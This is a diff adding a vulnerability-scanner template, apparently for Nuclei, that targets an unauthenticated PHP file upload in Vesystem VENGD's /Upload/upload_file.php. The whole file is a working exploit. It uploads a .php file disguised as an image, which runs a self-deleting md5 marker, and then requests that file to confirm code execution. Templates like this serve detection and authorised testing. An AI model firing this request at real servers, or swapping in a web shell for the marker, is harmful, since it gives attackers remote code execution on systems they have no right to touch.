@@ -1,0 +1,40 @@
+id: yaml-poc-vesystem-vengd-file_upload-CT-474074
+info:
+  name: Yaml Poc Vesystem Vengd File_Upload Ct 474074
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-vesystem-vengd-file_upload-CT-474074'
+  tags: fileupload
+  reference:
+  - https://blog.csdn.net/qq_17754023/article/details/123174458
+http:
+- method: POST
+  path:
+  - /Upload/upload_file.php?l={{rPath}}
+  body: '------{{rBoundary}}
+
+    Content-Disposition: form-data; name="file"; filename="{{rFilename}}.php"
+
+    Content-Type: image/avif
+
+
+    <?php echo md5({{rContent}});unlink(__FILE__);?>
+
+    ------{{rBoundary}}--'
+  headers:
+    Content-Type: multipart/form-data; boundary=----{{rBoundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /Upload/{{rPath}}/{{rFilename}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
